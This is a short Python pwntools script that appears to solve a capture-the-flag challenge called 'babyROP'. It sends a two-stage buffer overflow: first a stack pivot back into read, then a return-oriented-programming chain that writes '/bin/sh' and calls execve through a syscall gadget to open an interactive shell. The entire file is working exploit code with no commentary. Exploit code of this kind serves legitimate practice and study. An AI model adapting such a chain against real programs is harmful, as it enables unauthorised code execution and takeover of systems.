from pwn import *
import sys


context.arch = 'amd64'

Host = 'localhost'
Port = 10101

if len(sys.argv) > 1:
    r = remote(Host, Port)
else:
    r = process('./babyROP')

pop_rax_rdx_rbx = 0x478566
pop_rdi = 0x4014e6
pop_rsi = 0x401607
syscall = 0x467195

stack =0x6c9000
main_read = 0x4009f6

payload = 'A'*0x20 + flat([stack+0x100, main_read])
r.sendline(payload)

payload = '/bin/sh\x00' + 'A'*0x18 + flat([stack+0x200, pop_rdi, stack+0x100-0x20, pop_rsi, 0, pop_rax_rdx_rbx, 59, 0, 0, syscall])
r.sendline(payload)

r.interactive()
